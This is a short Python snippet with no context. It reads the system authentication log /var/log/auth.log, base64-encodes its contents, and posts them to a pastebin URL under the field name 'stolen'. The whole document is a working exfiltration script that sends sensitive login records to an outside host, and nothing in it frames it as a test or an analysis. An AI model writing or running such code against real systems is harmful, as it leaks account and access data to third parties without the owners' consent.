import requests, base64
with open("/var/log/auth.log", "rb") as f:
    d = base64.b64encode(f.read())
requests.post("https://pastebin.com/raw/ABC123", data={"stolen": d})